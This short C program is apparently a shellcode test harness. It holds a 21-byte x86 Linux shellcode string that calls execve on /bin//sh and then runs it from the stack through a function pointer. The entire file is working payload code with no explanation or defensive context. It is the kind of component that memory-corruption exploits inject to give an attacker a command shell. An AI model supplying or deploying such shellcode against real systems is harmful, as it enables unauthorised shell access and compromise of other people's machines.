#include<stdio.h>
#include<stdlib.h>

void main(){
  char shellcode[] = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";
  void(*func)() = (void(*)()) shellcode;
  (*func)();
}
